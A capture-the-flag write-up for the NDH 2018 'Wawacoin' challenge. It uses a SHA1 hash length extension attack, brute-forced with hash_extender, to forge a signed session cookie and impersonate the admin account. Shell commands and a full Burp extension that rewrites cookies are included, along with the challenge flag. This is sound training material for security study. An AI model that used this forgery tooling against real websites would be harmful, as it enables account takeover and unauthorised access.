---
title: Quals NDH 2018 - Wawacoin
authors: cnotin
layout: writeup
---
Solves: 23 / Points: 400 / Category: Crypto/web
## Challenge description
> Sell your house, buy WawaCoin cryptocurrency cyber-blockchain, ???, profit.

We have a website about a new cryptocurrency named *Wawacoin*. The registration is closed but a demo interface is offered.
It connects us automatically as the *demo* user, then we have to enter our credit card information. However the website refuses it, stating that we do not have enough money.

## Challenge resolution
### Information leak
First, we find that the login form discloses that the *admin* account is valid, since it returns different error messages ("Bad username" / "Bad password").

### Crypto cookie
This challenge is all about crypto(graphy|currency) since when logging as the *demo* user we are assigned a `session` cookie with the following content:
```
session=757365723d64656d6f|9183ff6055a46981f2f71cd36430ed3d9cbf6861
```

The *session* cookie has two parts whose role we assume based on their length:
* encrypted content
* SHA1 signature
We also notice that any modification of either part triggers either a 500 error, or a redirection to the login page.

Then, we try to find common crypto flaws such as padding oracles. We can try a [hash length extension attack](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks) too and observe the resulting behavior.

This attack happens when a flawed Message Authentication Code algorithm is based on the concatenation of `secret+payload`: by having the hash of this string, we can append arbitrary data to the payload and compute a valid hash without knowing the secret. A tool can be used to simply *extend* the hash based on the current known value.

### Hash length extension attack
We use the [*hash_extender*](https://github.com/iagox86/hash_extender) tool that supports SHA1.

We already have the format `--format sha1`, the original signature `--signature` and we want to start by adding just a char `--append A`.
We still miss two information:
* the original data, let's hope that it is the most obvious `user=demo`
* the length of the secret, let's bruteforce it!

For example, here is the output for two `--secret` lengths:
```shell
$ ./hash_extender --data user=demo --append A --signature 9183ff6055a46981f2f71cd36430ed3d9cbf6861 --format sha1 --secret 1
Type: sha1
Secret length: 1
New signature: 41b8fd13c9ad0b2f18fc76e0f17dd01768ca8b63
New string: 757365723d64656d6f80000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005041

$ ./hash_extender --data user=demo --append A --signature 9183ff6055a46981f2f71cd36430ed3d9cbf6861 --format sha1 --secret 2
Type: sha1
Secret length: 2
New signature: 41b8fd13c9ad0b2f18fc76e0f17dd01768ca8b63
New string: 757365723d64656d6f800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005841
```
The signature is identical, only the new string is slightly different.
Therefore, to bruteforce the secret, we have a fixed signature and generate the resulting values for a length of 0 to 30:
```shell
for i in $(seq 0 30); do ./hash_extender --data user=demo --append A --signature 9183ff6055a46981f2f71cd36430ed3d9cbf6861 --format sha1 --secret $i | grep "New string" | cut -d' ' -f3; done
```

We use *Burp Intruder* to try all the generated new strings, with the fixed signature. The payload for the length 16 gives an interesting result:
![Burp Intruder]({{ site.url }}/assets/wawacoin-intruder.png){: .image }

Note that the username is displayed in the HTML page on the logout button: it is very helpful to see how our payload is decrypted.
We confirm that we can successfully append characters to the encrypted *session* cookie which is a very nice power!

### Creating a custom *Burp* extension
We still need to find a vulnerability: something interesting to trigger with this string that the website is surely taking for trusted :smirk:

Generating a payload to probe for a vulnerability, testing it on the website, and retrying again and again is time-consuming. In this case, we like to create a *Burp* extension. You can find a very good and simple [example by Nicolas Grégoire / Agarri](http://www.agarri.fr/kom/archives/2013/10/22/exploiting_wpad_with_burp_suite_and_the_http_injector_extension/index.html) in Python [HTTPInjector.py](http://www.agarri.fr/docs/HTTPInjector.py).

In *Burp*, just go to Extender -> APIs and click on *Save interface files*. Extract the files in a `burp` folder and put your `.py` extension next to this folder.

The full code of our extension is at the end of this writeup.
It captures every outgoing request, from any tool (Proxy, Repeater, Scanner...), get the clear-text content of the *session* cookie and encrypt it using *hash_extender*. Just keep in mind that your payload is appended to the original payload.

It works wonders and is very efficent, isn't it? :ok_hand:
![Burp extension]({{ site.url }}/assets/wawacoin-burp-extension.png){: .image }

### Finding a vulnerability and the flag
Thanks to our extension, we quickly try several things and come to the conclusion that we can try to impersonate the admin.

If the original payload is: `user=demo`, what would happen if we append `&user=admin`?
The anwser is that the second `user` overwrites the first, we impersonate *admin* and get the flag:
![Got admin]({{ site.url }}/assets/wawacoin-got-admin.png){: .image }

![Got flag]({{ site.url }}/assets/wawacoin-flag.png){: .image }

Flag: `NDH{c7774051db4b880da67598770c955ff99363e76d}`

## Appendix: Burp extension
```python
# encoding: utf8
# Burp extension for the 'Wawacoin' NDH quals challenge
# By Clément Notin @cnotin
# Based on HTTPInjector by @Agarri_FR // http://www.agarri.fr/kom/archives/2013/10/22/exploiting_wpad_with_burp_suite_and_the_http_injector_extension/index.html

from burp import IBurpExtender
from burp import IHttpListener
import subprocess

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._helpers = callbacks.getHelpers()

        callbacks.setExtensionName("NDH quals")

        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        # only process requests
        if not messageIsRequest:
            return

        req = messageInfo.getRequest()
        req = self._helpers.bytesToString(req)

        if not "session=" in req:
            return
        if "GET /static" in req:
            return

        session = req.split("session=")[1].split("\r\n")[0]
        print "session before=" + session

        output = subprocess.check_output(["/root/tools/hash_extender/hash_extender",
                                          "--data", "user=demo",
                                          "--signature", "9183ff6055a46981f2f71cd36430ed3d9cbf6861",
                                          "--format", "sha1",
                                          "--secret", "16",
                                          "--append", session
                                          ])
        sig = output.split("New signature: ")[1].split("\n")[0]
        data = output.split("New string: ")[1].split("\n")[0]

        session_new = "%s|%s" % (data, sig)
        print "session after ="+session_new

        req = req.replace(session, session_new)

        req = self._helpers.stringToBytes(req)

        messageInfo.setComment("payload %s" % session)
        messageInfo.setHighlight("yellow")

        messageInfo.setRequest(req)
```
